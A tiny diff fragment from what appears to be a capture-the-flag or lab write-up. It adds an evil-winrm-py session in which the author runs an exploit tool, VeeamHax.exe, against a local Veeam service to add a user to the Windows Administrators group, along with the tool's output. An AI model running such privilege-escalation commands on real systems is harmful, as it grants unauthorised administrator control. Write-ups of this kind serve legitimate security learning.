@@ -433,7 +433,11 @@ evil-winrm-py PS C:\exploit>
 Ill upload all 4 files
 
 ```python
-
+evil-winrm-py PS C:\exploit> .\VeeamHax.exe --cmd 'net localgroup Administrators Ferdinand /add'
+Targeting 127.0.0.1:9401
+evil-winrm-py PS C:\exploit>
 ```
+
+
 
 
